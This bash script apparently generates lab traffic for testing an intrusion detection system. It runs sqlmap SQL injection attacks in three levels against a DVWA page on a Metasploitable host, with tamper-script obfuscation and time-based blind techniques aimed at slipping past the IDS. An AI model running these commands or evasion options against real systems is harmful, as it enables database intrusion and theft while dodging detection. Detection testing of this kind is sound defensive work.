#!/bin/bash

# =================================================================
# MODULE 04: SQL INJECTION (SQLMAP) - PAYLOAD ROTATION
# Strategy: 3 Level Depth (Basic, Obfuscation, Time-Based)
# Input: Receives argument $1 as the Round Number
# =================================================================

# Receive Input Round Number from Daily Round
ROUND=${1:-1} # Default to round 1 if empty

# TARGET CONFIGURATION
TARGET_IP="192.168.x.x"   # Replace with your Metasploitable IP
# DVWA SQL Injection URL (Make sure a user ID exists, e.g. id=1)
TARGET_URL="http://$TARGET_IP/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"

# IMPORTANT: Replace this string with your DVWA login session cookie!
# To get it: log in to DVWA -> F12 -> Storage -> Cookies -> PHPSESSID
COOKIE="security=low; PHPSESSID=replace_with_your_session_id"

LOG_FILE="logs/sqli_session_$(date +%F).log"

# Colors for Report Display
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# =================================================================
# PAYLOAD ROTATION LOGIC (PAYLOAD DIVERSITY)
# Changes the tamper script and extra options based on the round phase
# =================================================================
if [ "$ROUND" -le 10 ]; then
    # --- SET A (Round 1-10) ---
    # Level 2: Standard Tamper
    TAMPER_L2="space2comment,randomcase"
    DESC_L2="Tamper: Space2Comment & RandomCase"
    
    # Level 3: Default Time-Based
    EXTRA_OPTS_L3=""
    DESC_L3="Standard Time-Based"

elif [ "$ROUND" -le 20 ]; then
    # --- SET B (Round 11-20) ---
    # Level 2: Tamper Logic (changes > into NOT BETWEEN)
    TAMPER_L2="between"
    DESC_L2="Tamper: Between (Logical Obfuscation)"
    
    # Level 3: Random Agent (spoofing User-Agent)
    EXTRA_OPTS_L3="--random-agent"
    DESC_L3="Time-Based + Random User-Agent"

else
    # --- SET C (Round 21-30) ---
    # Level 2: Tamper Encoding (URL Encode)
    TAMPER_L2="charencode"
    DESC_L2="Tamper: CharEncode (URL Encoding)"
    
    # Level 3: Prefix Injection (adds a quote at the beginning)
    # Note: We escape the quote to keep the command string safe
    EXTRA_OPTS_L3="--prefix=\"'\""
    DESC_L3="Time-Based + Payload Prefix"
fi

echo "[+] [04_SQLMAP] Starting SQL Injection Module..."
echo "[+] Target: $TARGET_URL"
echo "[+] Mode: Round $ROUND ($DESC_L2)"
echo "[+] Start Time: $(date)"

# Check whether the cookie has been changed yet
if [[ "$COOKIE" == *"replace_with"* ]]; then
    echo -e "${RED}[!] WARNING: You have not replaced the PHPSESSID in the script yet!${NC}"
    echo -e "${RED}[!] The script may fail to log in to DVWA.${NC}"
    sleep 3
fi

# -----------------------------------------------------------------
# LEVEL 1: NOISY / CLASSIC SQL INJECTION (BASELINE)
# Goal: Baseline. Test detection of basic signatures.
# Technique: --batch (answers Y automatically), no concealment techniques.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 1] Running Basic SQL Injection (--batch)...${NC}"

# Store command in a variable (using escaped quotes for safe URL/cookie handling)
CMD="sqlmap -u \"$TARGET_URL\" --cookie=\"$COOKIE\" --drop-set-cookie --flush-session --fresh-queries --batch --dbs"

# Display the command on screen
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Execute the command (unique output per round)
eval $CMD > logs/sqlmap_lvl1_r${ROUND}.txt 2>&1
echo "    -> Completed. (Expected: ET WEB_SERVER SQL Injection alert)"
sleep 10

# -----------------------------------------------------------------
# LEVEL 2: EVASION / TAMPER SCRIPT (DYNAMIC)
# Goal: Confuse the IDS by randomizing the payload (obfuscation).
# Technique: Use the variable $TAMPER_L2, which changes each round set.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 2] Running $DESC_L2...${NC}"

# Store command (calling the $TAMPER_L2 variable)
CMD="sqlmap -u \"$TARGET_URL\" --cookie=\"$COOKIE\" --drop-set-cookie --flush-session --fresh-queries --batch --tamper=$TAMPER_L2 --dbs"

# Display the command
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Execute the command
eval $CMD > logs/sqlmap_lvl2_r${ROUND}.txt 2>&1
echo "    -> Completed. (Expected: false negative / 'Evasion' alert)"
sleep 10

# -----------------------------------------------------------------
# LEVEL 3: TIME-BASED BLIND & HIGH RISK (DYNAMIC)
# Goal: Test time anomaly detection plus header/prefix variations.
# Technique: --technique=T plus variable $EXTRA_OPTS_L3.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 3] Running $DESC_L3 (--level=5)...${NC}"

# Store command (calling the $EXTRA_OPTS_L3 variable)
CMD="sqlmap -u \"$TARGET_URL\" --cookie=\"$COOKIE\" --drop-set-cookie --flush-session --fresh-queries --batch --technique=T --level=3 --risk=2 $EXTRA_OPTS_L3 --dbs"

# Display the command
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Execute the command
eval $CMD > logs/sqlmap_lvl3_r${ROUND}.txt 2>&1
echo "    -> Completed. (Expected: detection via flow/timeout analysis)"

echo "[+] [04_SQLMAP] Module Finished at $(date)"
echo "-----------------------------------------------------------"
